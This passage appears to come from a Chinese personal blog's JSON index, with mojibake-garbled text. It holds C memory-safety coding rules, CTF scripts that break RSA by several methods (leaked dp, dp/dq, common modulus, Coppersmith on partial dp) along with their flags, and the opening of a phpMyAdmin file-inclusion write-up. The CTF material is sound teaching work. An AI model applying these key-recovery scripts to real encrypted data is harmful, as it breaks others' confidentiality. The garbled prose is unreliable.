*/\n\treturn;\n}\n```\nmemcpyä¸memmoveçš„ç›®çš„éƒ½æ˜¯å°†Nä¸ªå­—èŠ‚çš„æºå†…å­˜åœ°å€çš„å†…å®¹æ‹·è´åˆ°ç›®æ ‡å†…å­˜åœ°å€ä¸­ã€‚\nä½†å½“æºå†…å­˜å’Œç›®æ ‡å†…å­˜å­˜åœ¨é‡å æ—¶ï¼Œmemcpyä¼šå‡ºç°é”™è¯¯ï¼Œè€Œmemmoveèƒ½æ­£ç¡®åœ°å®æ–½æ‹·è´ï¼Œä½†è¿™ä¹Ÿå¢åŠ äº†ä¸€ç‚¹ç‚¹å¼€é”€ã€‚\nmemmoveçš„å¤„ç†æªæ–½ï¼š\n```\nï¬\tå½“æºå†…å­˜çš„é¦–åœ°å€ç­‰äºç›®æ ‡å†…å­˜çš„é¦–åœ°å€æ—¶ï¼Œä¸è¿›è¡Œä»»ä½•æ‹·è´\nï¬\tå½“æºå†…å­˜çš„é¦–åœ°å€å¤§äºç›®æ ‡å†…å­˜çš„é¦–åœ°å€æ—¶ï¼Œå®è¡Œæ­£å‘æ‹·è´\nï¬\tå½“æºå†…å­˜çš„é¦–åœ°å€å°äºç›®æ ‡å†…å­˜çš„é¦–åœ°å€æ—¶ï¼Œå®è¡Œåå‘æ‹·è´\n```\n## å†…å­˜ç®¡ç†\n### 1.ç¦æ­¢å¼•ç”¨æœªåˆå§‹åŒ–çš„å†…å­˜\nè¯´æ˜ï¼šæœ‰äº›å‡½æ•°å¦‚mallocåˆ†é…å‡ºæ¥çš„å†…å­˜æ˜¯æ²¡æœ‰åˆå§‹åŒ–çš„ï¼Œå¯ä»¥ä½¿ç”¨memsetè¿›è¡Œæ¸…é›¶ï¼Œæˆ–è€…ä½¿ç”¨callocè¿›è¡Œå†…å­˜åˆ†é…ï¼Œcallocåˆ†é…çš„å†…å­˜æ˜¯æ¸…é›¶çš„ã€‚å½“ç„¶ï¼Œå¦‚æœåé¢éœ€è¦å¯¹ç”³è¯·çš„å†…å­˜è¿›è¡Œå…¨éƒ¨èµ‹å€¼ï¼Œå°±ä¸è¦æ¸…é›¶äº†ï¼Œä½†è¦ç¡®ä¿å†…å­˜è¢«å¼•ç”¨å‰æ˜¯è¢«åˆå§‹åŒ–çš„ã€‚æ­¤å¤–ï¼Œåˆ†é…å†…å­˜åˆå§‹åŒ–ï¼Œå¯ä»¥æ¶ˆé™¤ä¹‹å‰å¯èƒ½å­˜æ”¾åœ¨å†…å­˜ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œé¿å…æ•æ„Ÿä¿¡æ¯çš„æ³„éœ²ã€‚\né”™è¯¯ç¤ºä¾‹ï¼šå¦‚ä¸‹ä»£ç æ²¡æœ‰å¯¹mallocçš„yå†…å­˜è¿›è¡Œåˆå§‹åŒ–ï¼Œæ‰€ä»¥åŠŸèƒ½ä¸æ­£ç¡®ã€‚\n```c\n/* return y = Ax */\nint * Noncompliant(int **A, int *x, int n)\n{\n\tif(n <= 0)\n\t\treturn NULL;\n\tint *y = (int*)malloc (n * sizeof (int));\n\tif(y == NULL)\n\t\treturn NULL;\n\tint i, j;\n\tfor (i = 0; i < n; ++i)\n\t{\n\t\tfor (j = 0; j < n; ++j)\n\t\t{\n\t\t\ty[i] += A[i][j] * x[j];\n\t\t}\n\t}\n\treturn y;\n}\n/*...ç”³è¯·çš„å†…å­˜ä½¿ç”¨åfree...*/ \n```\næ¨èåšæ³•ï¼šä½¿ç”¨memsetå¯¹åˆ†é…å‡ºæ¥çš„å†…å­˜æ¸…é›¶ã€‚\n```c\nint * Compliant(int **A, int *x, int n)\n{\n\tif(n <= 0)\n\t\treturn NULL;\n\tint *y = (int*)malloc(n * sizeof (int));\n\tif(y == NULL)\n\t\treturn NULL;\n\tint i, j;\n\tmemset (y, 0, n * sizeof(int)); //ã€ä¿®æ”¹ã€‘ç¡®ä¿å†…å­˜è¢«åˆå§‹åŒ–åæ‰è¢«å¼•ç”¨\n\tfor (i = 0; i < n; ++i)\n\t{\n\t\tfor (j = 0; j < n; ++j)\n\t\t{\n\t\t\ty[i] += A[i][j] * x[j];\n\t\t}\n\t}\n\treturn y;\n}\n/*...ç”³è¯·çš„å†…å­˜ä½¿ç”¨åfree...*/ \n```\n### 2.ç¦æ­¢è®¿é—®å·²ç»é‡Šæ”¾çš„å†…å­˜\nè¯´æ˜ï¼šè®¿é—®å·²ç»é‡Šæ”¾çš„å†…å­˜ï¼Œæ˜¯å¾ˆå±é™©çš„è¡Œä¸ºï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š\nï¼ˆ1ï¼‰å †å†…å­˜ï¼šä¸€å—å†…å­˜é‡Šæ”¾äº†ï¼Œå½’è¿˜å†…å­˜æ± ä»¥åï¼Œå°±ä¸åº”è¯¥å†è®¿é—®ã€‚å› ä¸ºè¿™å—å†…å­˜å¯èƒ½å·²ç»è¢«å…¶ä»–éƒ¨åˆ†ä»£ç ç”³è¯·èµ°ï¼Œå†…å®¹å¯èƒ½å·²ç»è¢«ä¿®æ”¹ï¼›ç›´æ¥ä¿®æ”¹é‡Šæ”¾çš„å†…å­˜ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…¶ä»–ä½¿ç”¨è¯¥å†…å­˜çš„åŠŸèƒ½ä¸æ­£å¸¸ï¼›è¯»ä¹Ÿä¸èƒ½ä¿è¯æ•°æ®å°±æ˜¯é‡Šæ”¾ä¹‹å‰å†™å…¥çš„å€¼ã€‚åœ¨ä¸€å®šçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è¢«åˆ©ç”¨æ‰§è¡Œæ¶æ„çš„ä»£ç ã€‚å³ä½¿æ˜¯å¯¹ç©ºæŒ‡é’ˆçš„è§£å¼•ç”¨ï¼Œä¹Ÿå¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚å¦‚æœé»‘å®¢äº‹å…ˆå¯¹å†…å­˜0åœ°å€å†…å®¹è¿›è¡Œæ¶æ„çš„æ„é€ ï¼Œè§£å¼•ç”¨åä¼šæŒ‡å‘é»‘å®¢æŒ‡å®šçš„åœ°å€ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚\nï¼ˆ2ï¼‰æ ˆå†…å­˜ï¼šåœ¨å‡½æ•°æ‰§è¡Œæ—¶ï¼Œå‡½æ•°å†…å±€éƒ¨å˜é‡çš„å­˜å‚¨å•å…ƒéƒ½å¯ä»¥åœ¨æ ˆä¸Šåˆ›å»ºï¼Œå‡½æ•°æ‰§è¡Œå®Œæ¯•ç»“æŸæ—¶è¿™äº›å­˜å‚¨å•å…ƒè‡ªåŠ¨é‡Šæ”¾ã€‚å¦‚æœè¿”å›è¿™äº›å·²é‡Šæ”¾çš„å­˜å‚¨å•å…ƒçš„åœ°å€ï¼ˆæ ˆåœ°å€ï¼‰ï¼Œå¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒæˆ–æ¶æ„ä»£ç è¢«åˆ©ç”¨ã€‚\né”™è¯¯ç¤ºä¾‹1ï¼šè§£å¼•ç”¨ä¸€ä¸ªå·²ç»é‡Šæ”¾äº†å†…å­˜çš„æŒ‡é’ˆï¼Œä¼šå¯¼è‡´æœªå®šä¹‰çš„è¡Œä¸ºã€‚\n```c\ntypedef struct _tagNode\n{\n\tint\tvalue;\n\tstruct _tagNode * next;\n}Node;\nNode *  Noncompliant()\n{\n\tNode * head = (Node *)malloc(Node);\n\tif (head==NULL)\n\t{\n\t\t/* ...do something... */\n\t\treturn NULL;\n\t}\n\t/* ...do something... */\n\tfree(head);\n\t/* ...do something... */\n\thead->next = NULL;  //ã€é”™è¯¯ã€‘è§£å¼•ç”¨äº†å·²ç»é‡Šæ”¾çš„å†…å­˜\n\treturn head;\n}\n```\né”™è¯¯ç¤ºä¾‹2ï¼šå‡½æ•°ä¸­è¿”å›çš„å±€éƒ¨å˜é‡æ•°æ®æœ‰å¯èƒ½ä¼šè¢«è¦†ç›–æ‰ï¼Œå¯¼è‡´æœªå®šä¹‰çš„è¡Œä¸ºã€‚\n```c\nchar *  Noncompliant()\n{\n\tchar msg[128];\n\t/* ...do something... */\n\treturn msg;  //ã€é”™è¯¯ã€‘è¿”å›äº†å±€éƒ¨å˜é‡\n}\n```\n### 3.ç¦æ­¢é‡å¤é‡Šæ”¾å†…å­˜\nè¯´æ˜ï¼šé‡å¤é‡Šæ”¾å†…å­˜ï¼ˆdouble-freeï¼‰ä¼šå¯¼è‡´å†…å­˜ç®¡ç†å™¨å‡ºç°é—®é¢˜ã€‚é‡å¤é‡Šæ”¾å†…å­˜åœ¨ä¸€å®šæƒ…å†µä¸‹ï¼Œæœ‰å¯èƒ½å¯¼è‡´â€œå †æº¢å‡ºâ€æ¼æ´ï¼Œå¯ä»¥è¢«ç”¨æ¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œå…·æœ‰å¾ˆå¤§çš„å®‰å…¨éšæ‚£ã€‚\né”™è¯¯ç¤ºä¾‹ï¼šå¦‚ä¸‹ä»£ç ä¸¤æ¬¡é‡Šæ”¾äº†ptrã€‚\n```c\nvoid  Noncompliant()\n{\n\tchar *ptr = (char*)malloc(size);\n\tif (ptr)\n\t{\n\t\t/* ...do something... */\n\t\tfree(ptr);\n\t}\n\t/* ...do something... */\n\tfree(ptr); //ã€é”™è¯¯ã€‘æœ‰å¯èƒ½å‡ºç°2æ¬¡é‡Šæ”¾å†…å­˜çš„é”™è¯¯\n}\n```\næ¨èåšæ³•ï¼šç”³è¯·çš„å†…å­˜åº”è¯¥åªé‡Šæ”¾ä¸€æ¬¡ã€‚\n```c\nvoid  Compliant()\n{\n\tchar *ptr = (char*)malloc(size);\n\tif (ptr)\n\t{\n\t\t/* ...do something... */\n\t\tfree(ptr);\n\t\tptr = NULL;\n\t} \n\t/* ...do something... */\n\t//ã€ä¿®æ”¹ã€‘åˆ æ‰free(ptr)\n}\n```\n### 4.å¿…é¡»å¯¹æŒ‡å®šç”³è¯·å†…å­˜å¤§å°çš„æ•´æ•°å€¼è¿›è¡Œåˆæ³•æ€§æ ¡éªŒ\nè¯´æ˜ï¼šç”³è¯·å†…å­˜æ—¶æ²¡æœ‰å¯¹æŒ‡å®šçš„å†…å­˜å¤§å°æ•´æ•°ä½œåˆæ³•æ€§æ ¡éªŒï¼Œä¼šå¯¼è‡´æœªå®šä¹‰çš„è¡Œä¸ºï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š\nï¼ˆ1ï¼‰ä½¿ç”¨ 0 å­—èŠ‚é•¿åº¦å»ç”³è¯·å†…å­˜çš„è¡Œä¸ºæ˜¯æ²¡æœ‰å®šä¹‰çš„ï¼Œåœ¨å¼•ç”¨å†…å­˜ç”³è¯·å‡½æ•°è¿”å›çš„åœ°å€æ—¶ä¼šå¼•å‘ä¸å¯é¢„çŸ¥æˆ–ä¸èƒ½ç«‹å³å‘ç°çš„é—®é¢˜ã€‚å¯¹äºå¯èƒ½å‡ºç°ç”³è¯·0åœ°å€çš„æƒ…å†µï¼Œéœ€è¦å¢åŠ å¿…è¦çš„åˆ¤æ–­ï¼Œé¿å…å‡ºç°è¿™ç§æƒ…å†µ\nï¼ˆ2ï¼‰ä½¿ç”¨è´Ÿæ•°é•¿åº¦å»ç”³è¯·å†…å­˜ï¼Œè´Ÿæ•°ä¼šè¢«å½“æˆä¸€ä¸ªå¾ˆå¤§çš„æ— ç¬¦å·æ•´æ•°ï¼Œä»è€Œå¯¼è‡´å› ç”³è¯·å†…å­˜è¿‡å¤§è€Œå‡ºç°å¤±è´¥ï¼Œé€ æˆæ‹’ç»æœåŠ¡ã€‚\né”™è¯¯ç¤ºä¾‹ï¼šä¸‹åˆ—ä»£ç è¿›è¡Œå†…å­˜åˆ†é…æ—¶ï¼Œæ²¡æœ‰å¯¹å†…å­˜å¤§å°æ•´æ•°ä½œåˆæ³•æ€§æ ¡éªŒã€‚\n```c\nint * Noncompliant(int x)\n{\n\tint i;\n\tint * y = (int *)malloc( x * sizeof(int));  //æœªå¯¹xè¿›è¡Œåˆæ³•æ€§æ ¡éªŒ\n\tfor(i=0; i<x; ++i)\n\t{\n\t\ty[i] = i;\n\t}\n\treturn y;\n}\n/*...ç”³è¯·çš„å†…å­˜ä½¿ç”¨åfree...*/ \n```\næ¨èåšæ³•ï¼šè°ƒç”¨mallocä¹‹å‰ï¼Œéœ€è¦åˆ¤æ–­mallocçš„å‚æ•°æ˜¯å¦åˆæ³•ã€‚ç¡®ä¿xä¸ºæ•´æ•°åæ‰ç”³è¯·å†…å­˜ï¼Œå¦åˆ™è§†ä¸ºå‚æ•°æ— æ•ˆï¼Œä¸äºˆç”³è¯·ï¼Œä»¥é¿å…å‡ºç°ç”³è¯·è¿‡å¤§å†…å­˜è€Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚\n```c\nint * Compliant(int x)\n{\n\tint i;\n\tint *y;\n\tif(x > 0)   //ã€ä¿®æ”¹ã€‘å¢åŠ å¯¹xè¿›è¡Œåˆæ³•æ€§æ ¡éªŒ\n\t{\n\t\ty = (int *)malloc( x * sizeof(int));\n\t\tif (y == NULL)\n\t\t\treturn NULL;\n\t}\n\telse\n\t{\n\t\treturn NULL;\n\t}\n\tfor(i=0; i<x; ++i)\n\t{\n\t\ty[i]=i;\n\t}\n\treturn y;\n}\n/*...ç”³è¯·çš„å†…å­˜ä½¿ç”¨åfree...*/ \n```\n### 5.ç¦æ­¢é‡Šæ”¾éåŠ¨æ€ç”³è¯·çš„å†…å­˜\nè¯´æ˜ï¼šéåŠ¨æ€ç”³è¯·çš„å†…å­˜å¹¶ä¸æ˜¯ç”±å†…å­˜åˆ†é…å™¨ç®¡ç†çš„ï¼Œå¦‚æœä½¿ç”¨freeå‡½æ•°å¯¹è¿™å—å†…å­˜è¿›è¡Œé‡Šæ”¾ï¼Œä¼šå¯¹å†…å­˜åˆ†é…å™¨äº§ç”Ÿå½±å“ï¼Œé€ æˆæ‹’ç»æœåŠ¡ã€‚å¦‚æœé»‘å®¢èƒ½æ§åˆ¶éåŠ¨æ€ç”³è¯·çš„å†…å­˜å†…å®¹ï¼Œå¹¶å¯¹å…¶è¿›è¡Œç²¾å¿ƒçš„æ„é€ ï¼Œç”šè‡³å¯¼è‡´ç¨‹åºæ‰§è¡Œä»»æ„ä»£ç ã€‚\né”™è¯¯ç¤ºä¾‹ï¼šéæ³•é‡Šæ”¾éåŠ¨æ€ç”³è¯·çš„å†…å­˜ã€‚\n```c\nvoid  Noncompliant()\n{\n\tchar str[] = \"this is a string\";\n\t/* ...do something... */\n\tfree(str);    //ã€é”™è¯¯ã€‘strä¸æ˜¯åŠ¨æ€ç”³è¯·çš„å†…å­˜ï¼Œå› æ­¤ä¸èƒ½é‡Šæ”¾\n}\n```\næ¨èåšæ³•ï¼šéåŠ¨æ€åˆ†é…çš„å†…å­˜ä¸éœ€è¦é‡Šæ”¾ï¼ŒæŠŠåŸæ¥é‡Šæ”¾å‡½æ•°free()å»æ‰ã€‚\n```c\nvoid  Compliant ()\n{\n\tchar str[] = \"this is a string\";\n\t/* ...do something... */\n\t//ã€ä¿®æ”¹ã€‘åˆ é™¤free(str)\n}\n```\n### 6.é¿å…ä½¿ç”¨allocaå‡½æ•°ç”³è¯·å†…å­˜\nè¯´æ˜ï¼šPOSIXå’ŒC99 å‡æœªå®šä¹‰ alloca çš„è¡Œä¸ºï¼Œåœ¨ä¸æ”¯æŒçš„å¹³å°ä¸Šè¿è¡Œä¼šæœ‰æœªå®šä¹‰çš„åæœï¼Œä¸”è¯¥å‡½æ•°åœ¨æ ˆå¸§é‡Œç”³è¯·å†…å­˜ï¼Œç”³è¯·çš„å¤§å°å¯èƒ½è¶Šè¿‡æ ˆçš„è¾¹ç•Œè€Œæ— æ³•é¢„çŸ¥ã€‚\né”™è¯¯ç¤ºä¾‹ï¼šä½¿ç”¨äº†allocaä»å †æ ˆåˆ†é…å†…å­˜\n```c\nvoid  Noncompliant(char *buff, int len)\n{\n\tint size = len * 3 + 1, i;\n\tchar *ptr = alloca (size), *p; //ã€ä¸æ¨èã€‘é¿å…ä½¿ç”¨allocaå‡½æ•°ç”³è¯·å†…å­˜\n\tif (len <= 0)\n\t\treturn;\n\tif (ptr == NULL)\n\t\treturn;\n\tp = ptr;\n\tfor (i = 0; i < len; ++i)\n\t{\n\t\tp += _snprintf(p, 4, \"%02x \", buff[i]);\n\t}\n\t*p = NULL;\n\tprintf (\"%s\", ptr);\n}\n```\næ¨èåšæ³•ï¼šallocaå‡½æ•°è¿”å›åï¼Œä½¿ç”¨æŒ‡å‘å‡½æ•°å±€éƒ¨å †æ ˆå†…å­˜åŒºä¹Ÿä¼šå‡ºç°é—®é¢˜ï¼Œæ”¹ç”¨mallocä»å †åˆ†é…å†…å­˜ã€‚\n\n\n\n","tags":["Cå’ŒC++"],"categories":["Course"]},{"title":"RSAæ€»ç»“","url":"/posts/55360.html","content":"### å·²çŸ¥ï¼ˆdp,e,n,cï¼‰ dp=d%(p-1)\n\negï¼š\n```python\ne = 65537\nn = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113\ndp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657\nc = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751\n```\nexp:\n```python\nimport gmpy2\nimport libnum\ne = 65537\nn = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113\ndp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657\nc = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751\n\nfor i in range(1,65538):\n    if (dp*e-1)%i == 0:\n        if n%(((dp*e-1)/i)+1)==0:\n            p=((dp*e-1)/i)+1\n            q=n/(((dp*e-1)/i)+1)\n            phi = (p-1)*(q-1)\n            d = gmpy2.invert(e,phi)%phi\n            print libnum.n2s(pow(c,d,n))\n```\n```\nflag{wow_leaking_dp_breaks_rsa?_98924743502}\n```\n### å·²çŸ¥(dp,dq,q,p,c)\neg:\n```python\ndp= 90494486973243104756298311175705002887155440121025946664275790548694955799661434870163629541771658812502682012435200659355928618529521731475360236486362525996535354732687624609637012830178545914960485330748345108757203508531117591067570383564779625954776907685968592668868046507450242047759226407026094726359\ndq= 92386717102324384872139253931247976320472847834037799716676564640678692924258053130751618730959510913784801723023536527134208843358920592320351399005428347188639433875570867152865970587272904695272790831679276818402117343413503376057524788386479263579869430615501089905630519162146030369086836183772975252551\np= 121869669684596731118740111360803257498670698122183387353481580136405322481841982461820301261370579505460038281590785837096967719889404913176714663774999789266522508163678949469953184327222227297952119212490499582581953510522212981687122483764873187827531047946130999532741388680549345732675732040579796067001\nq= 128363031923139297392077349407719417788135630403499671848196425800900870531452570499668481104884553795224784931947824885511134525485570129640119439950191944938407656926280993408854767711557863016197167505998324659906146937423415404059310560359693643987781862684489401368519777953281060013045590132161625607377\nc= 4176193749773450562408160796325873473193702511560805285554329767573726211097194419198463203488792792756598428753745425419950423161673497255820731183746106463781291156892140581651301528184812357534808298071893380519977926677138246941946185699346532140641376461516107672722425971178865758049759985915001009787241295292157744353554548314911531918044654676691927347018033509499136103964942830581407087547565204232556314726045307279963709599952745342811947421707024572981812906869557834491207590418553244020621858083633564878305733114484857827620268881100166090837841224767358579366482347136224695333980041913268394994302\n```\nexpï¼š\n```python\ndef decrypt(dp,dq,p,q,c):\n    InvQ = gmpy2.invert(q, p)\n    mp = pow(c, dp, p)\n    mq = pow(c, dq, q)\n    m = (((mp-mq)*InvQ) % p)*q+mq\n    print libnum.n2s(m)\n\ndp= 24417628139330679432551095868116968814142396193102639509841676574931690513464588523684381397207121003439385360929299071710433231196678202942915347185802024747158497456267595000613289619481116892073493417896024118597833611923086327107489774162727006791982668721110819684552525393969199138125692085053266311867\ndq= 39019112110614280252241495036646034807151213716557526376274345944263453299622818575225245299195523420254672088668617876062998490653404750105272510633841394184860866942704080992475543547501372565259180366123356119418623253283732615682878021900318153700726522250094020806743598752556541454865233668070931534349\np= 114461439704891616590422134857421869878753559940962522699708885701308630438427731936479777010552391068812199529467348873013239528376604282404207321401876195560830474695517139918118078685078197948576662138382523308600480733574419071424466292785993331731881271557573094521160051353184489095799816579282742140953\nq= 173407999660109485520889209734134041910836523881475540116955713891631837403964097088089751678165465931150331234455699896350201315926126639981461748491240790317968076899655657331112140939100897570439934688992874242416328330344836429844042122956843979375681077968897817612357468397424082494911472122421034561779\nc= 13156088528156801357013836665002509320288819562687150049688430847488062217199478847649128772442129783962344653461951822569890099822350753026372449754819799394899656016487248023042927376134885257136511477879900672582593964626335310995748816166750941755394630154620318544805488209700324391789948495807096701620546557726907853315159542234979480907794659188799145765761654813882682456135251746607111274015475601810166327843158879230660349983897375641623569327757258851636029354634714133778666281729500815659100876558161468140039778498553902396380237570072543395294246750182054410091138654202418836971487515663618000662737\ndecrypt(dp,dq,p,q,c)\n```\n```\nflag{dp_dq_is_very_dangerous!_47325684736584}\n```\n### å…±æ¨¡æ”»å‡»\n\neg:\n```python\nc1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361\nn=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801\ne1=11187289\nc2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397\ne2=9647291\n```\nexp:\n```python\n#-*-coding:utf-8 -*-\nfrom gmpy2 import *\nimport libnum\n\nn=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801\ne1=11187289\ne2=9647291\ns = gcdext(e1, e2) #e1*s1+e2*s2 = 1\ns1 =  s[1]\ns2 = -s[2]\n\nc1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361\nc2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397\nc2 = invert(c2, n) \n'''\næˆ‘ä»¬çŸ¥é“è§£å‡ºæ¥s2æ˜¯è´Ÿæ•°ã€‚\nè€Œåœ¨æ•°è®ºæ¨¡è¿ç®—ä¸­ï¼Œè¦æ±‚ä¸€ä¸ªæ•°çš„è´Ÿæ•°æ¬¡å¹‚ï¼Œä¸å¸¸è§„æ–¹æ³•å¹¶ä¸ä¸€æ ·ã€‚\næ¯”å¦‚æ­¤å¤„è¦æ±‚c2çš„s2æ¬¡å¹‚ï¼Œå°±è¦å…ˆè®¡ç®—c2çš„æ¨¡åå…ƒç´ c2'ï¼Œç„¶åæ±‚c2'çš„s2æ¬¡å¹‚ã€‚\n'''\nm = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n   # m=(c1^s1*c2^s2)%n\nprint libnum.n2s(m)\n```\n```\nflag{49d91077a1abcb14f1a9d546c80be9ef}\n```\n[RSA å…±æ¨¡æ”»å‡» Isc2016â€”â€”PhrackCTF](https://www.jianshu.com/p/9b44512d898f)\n\n\n\n\n\n```python\nfrom Crypto.Util.number import*\nimport gmpy2\nfrom tqdm import tqdm\n\ndef get_p(p_low, mod):\n    F.<z> = PolynomialRing(Zmod(N))\n    f = mod * z + p_low\n    f = f.monic()\n    res = f.small_roots(beta=0.44, epsilon= 1/28)\n\n    if len(res) > 0:\n        return 1, res[0]\n    return 0, 0\n\ndp_low = 1642122247947767590084047512154856959705749371720710428047250478126321193705946117104552307567185209952017\nN = 53290208062987048378703574235428685467319210471478014757229530639473548433668122104609082311237893278140109351209752453324855439700478949142631006593125874482133364050198292529339327668306943207846561273907830779959709641714284066463679953568692820076085446240980505949826504849495848235048490118010959579651\nc =  12164583901228226723569831803555747425419794714331207509347997795520206866173813478558747259319024376651968008838562856265966903471803669392265118265704723742518812401306445616633449971845569756343283456918105040589961351125414282181230864299705837250020888494290318050869813023592249838047791552928679622761\ne = 0x10001\nmod = 2^351\n\ntag = 0\nfor k in tqdm(range(1, e + 1)):\n    p = var('p')\n    p_low = solve_mod([e * dp_low == 1 + k * (p - 1)], mod)\n    if len(p_low) != 0:\n        # print(p_low)\n        for i in range(len(p_low)):\n            result = get_p(int(p_low[i][0]), mod)\n            if result[0]:\n                p = int(mod * result[1] + int(p_low[i][0]))\n                print(p)\n                tag = 1\n                break\n    if tag == 1:\n        break\nq = N // p\nphi = (p-1) * (q-1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, N)\nprint(long_to_bytes(m).decode())\n\n```\n\n","tags":["Crypto"],"categories":["CTF"]},{"title":"BUUCTF-Web-WriteUp","url":"/posts/9796.html","content":"### WarmUpã€2018-HCTFã€‘\n\n**çŸ¥è¯†ç‚¹**ï¼šä»£ç å®¡è®¡ï¼Œphpmyadminä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´\n**å‚è€ƒ**ï¼š[phpmyadmin 4.8.1ä»»æ„æ–‡ä»¶åŒ…å«](https://blog.51cto.com/13770310/2131305?source=dra)\n\n**æ¶‰åŠå‡½æ•°**ï¼š[$_REQUEST](https://www.php.net/manual/zh/reserved.variables.request.php)  , [in_array()](https://www.php.net/manual/zh/function.in-array.php) , [mb_substr()](https://www.php.net/manual/zh/function.mb-substr.php) , [mb_strpos()](https://www.php.net/manual/zh/function.mb-strpos.php)\n\næ‰“å¼€é¢˜ç›®æŸ¥çœ‹æºç ï¼Œå‘ç°`source.php`,è·Ÿè¿›å¾—åˆ°æºç \n```php\n <?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&$page)\n        {\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it\";\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST['file'])\n        && is_string($_REQUEST['file'])\n        && emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    } else {\n        echo \"<br><img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n    }  \n?> \n```\nä»£ç å®¡è®¡ï¼Œ`whitelistæ•°ç»„`é‡Œæœ‰å¦ä¸€ä¸ªå…ƒç´ `hint.php`ï¼Œè¿›å»çœ‹çœ‹,æç¤ºäº†`flag`å­˜å‚¨çš„ä½ç½®\n```\nflag not here, and flag in ffffllllaaaagggg\n```\nå…³é”®ä»£ç ï¼š\n```php\nif (! empty($_REQUEST['file'])\n        && is_string($_REQUEST['file'])\n        && emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    }\n```\n\nå³æ»¡è¶³è¿™ä¸‰ä¸ªæ¡ä»¶æ‰èƒ½å¤ŸåŒ…å«(`include$_REQUEST['file']`)\n```php\n$ 